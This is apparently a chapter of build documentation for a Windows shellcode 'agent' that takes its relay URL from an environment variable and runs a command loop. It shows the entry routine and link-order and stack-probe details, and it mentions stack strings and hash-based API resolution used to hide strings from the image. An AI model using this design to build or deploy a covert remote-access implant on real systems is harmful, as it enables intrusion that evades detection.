# Entry and Stack Probes: Where the Agent Begins

Every C program you have written starts at `main()`. This one does not.
And the function that replaces it is not allowed to share a file with
anything else. Both rules are load-bearing — this chapter explains why.

**Primary source files:**
- `entry.c` — 35 lines, the entire file
- `src/stack_probes.c` — 95 lines of asm, deliberately NOT in entry.c
- `include/entry.h` — the `agent_main` contract

---

## 1. Why There Is No `main()`

The build links with `-nostdlib`: no CRT, no startup object, nothing. The
Windows loader (or a shellcode loader, for the `.bin` blob) jumps to the
PE header's entry address — and for the blob, there is no PE header at
all: **byte 0 of the blob IS the entry point.**

`entry()` is that byte 0. Naming it `main` would be a lie: there is no
runtime to call it, no `argc`/`argv` to hand it, no exit code collector
waiting for its return.

---

## 2. What entry() Does

```c
__attribute__((section(".text"), used))
void entry(void)
{
    KERNEL32 entry_k32;
    if (!KERNEL32_Ctor(&entry_k32))
        return;

    CHAR env_name[8];
    BuildUrlEnvironmentVariableName(env_name);

    CHAR url_arg[2048];
    if (GetVariable(env_name, url_arg, sizeof(url_arg)) == 0) {
        LOG_ERROR("Environment variable W_URL not set");
        return;
    }

    WCHAR url_arg_w[2048];
    if (AnsiToWide(url_arg, url_arg_w, 2048) < 0) {
        LOG_ERROR("Environment variable W_URL is invalid");
        return;
    }

    INT32 rc = agent_main(url_arg_w);
    entry_k32.ExitProcess((UINT32)rc);
}
```

Step by step:

1. **Resolve kernel32 first.** Nothing else can happen — not even an
   error print — without `WriteFile`/`ExitProcess`, and those come from
   the kernel32 table (see [03 - PEB and Hash Resolution](03-peb-hash-resolution.md)).
   If this fails the process simply returns; there is no one to tell.

2. **Build the name `W_URL` on the stack** (`BuildUrlEnvironmentVariableName`). It cannot be a
   string literal — literals live in `.rdata` and the blob has none
   (see [04 - Stack Strings](04-stack-strings.md)). This exact literal
   was once the last `.rdata` entry in the binary; as a stack string it
   is gone from the image entirely.

3. **Read the environment block through the PEB**
   (`GetVariable`, [03](03-peb-hash-resolution.md)). The relay address
   arrives as the `W_URL` environment variable of the host process, and a loader that runs
   the blob inside another process inherits that process's environment.

4. **Widen and hand off** to `agent_main` (the dial/serve/redial loop,
   [06 - Command Protocol](06-command-protocol.md)). When it returns,
   `ExitProcess(rc)` — there is no caller to `ret` to.

The `section(".text")` attribute puts `entry` in plain `.text` (not gcc's
default `.text.startup`), and `used` stops the compiler from discarding
it as unreferenced.

---

## 3. The Link-Order Contract

**`entry.o` must be the FIRST object on the link line.** Not "somewhere
in the list" but first.

The linker lays out the output `.text` in the order the objects appear.
Whatever object comes first occupies byte 0. Since the blob has no
headers, a loader jumps to byte 0 — so byte 0 must be `entry()`:

```
$ objdump -f minimal_agent.exe | grep "start address"
start address 0x0000000140001000
$ objdump -h minimal_agent.exe | grep .text
0 .text ... 0000000140001000 ...      ← same address = entry is byte 0
```

The trap that keeps on giving: a PowerShell glob like
`(Get-ChildItem obj\*.o ...)` sorts **alphabetically** — `advapi.o`
first, `entry.o` sixth. The resulting exe still runs (Windows jumps by
the PE header, which points at the right address), but the `.bin` blob
starts with `ADVAPI_Ctor`'s prologue and dies instantly when a loader
jumps to offset 0. The failure is silent: the blob just exits.

---

## 4. Why the Stack Probes Live in a Different File

`src/stack_probes.c` contains hand-written asm implementations of the
compiler's stack-probe helpers:

| Arch | Symbol the compiler calls | Contract |
|---|---|---|
| x86_64 | `__chkstk` / `___chkstk_ms` | RAX = bytes needed; walk pages DOWN from `[rsp+0x18]`, `orq 0,(rcx)` to commit each guard page; RSP untouched |
| i386 | `__alloca`, `__chkstk`, `_chkstk`, `___alloca` | EAX = bytes; page walk probes below the frame, then **rewrites ESP** — the probe itself allocates: it moves the return address down to the new stack top, sets ESP to the frame base, and returns into the caller. The caller addresses locals at positive ESP offsets and frees with `add esp, N` |
| i386 | `___chkstk_ms` / `__chkstk_ms` | EAX = bytes; SP-untouched walk (a different contract — callers adjust) |
| aarch64 | `__chkstk` | X15 = bytes; probe down with `str xzr` |

Any function whose frame exceeds one page (ours go up to 142 KB on
i386 — `run_session` carries a 64 KB message buffer on its frame) calls
one of these before touching locals, so the OS can grow the stack
legally instead of the allocation skipping the guard page and
faulting.

Why not in `entry.c`? Because **top-level `asm()` always occupies the
start of the object's `.text`** — regardless of where in the file it is
written. An `entry.c` carrying both the probes and `entry()` emits the
probe code first; byte 0 becomes `__chkstk`, not `entry()`. The probes
were split out precisely so `entry.c` contains nothing but `entry()`.

## 5. Compile-Time Arch Detection

`include/types.h` normalizes the mess of compiler macros into
`ENVIRONMENT_x86_64` / `ENVIRONMENT_I386` / `ENVIRONMENT_ARM64` /
`ENVIRONMENT_ARM32` for MSVC, GCC and Clang alike. Every arch-dependent
site (`#if defined(ENVIRONMENT_x86_64) || defined(__x86_64__) ||
defined(_M_X64)`) checks both spellings — the normalization predates the
checks, and both are kept so either works.

## Next

`entry()` resolved kernel32 by calling `KERNEL32_Ctor` — which found
kernel32.dll without importing it. How that works is the next chapter:
[03 - PEB and Hash Resolution](03-peb-hash-resolution.md).
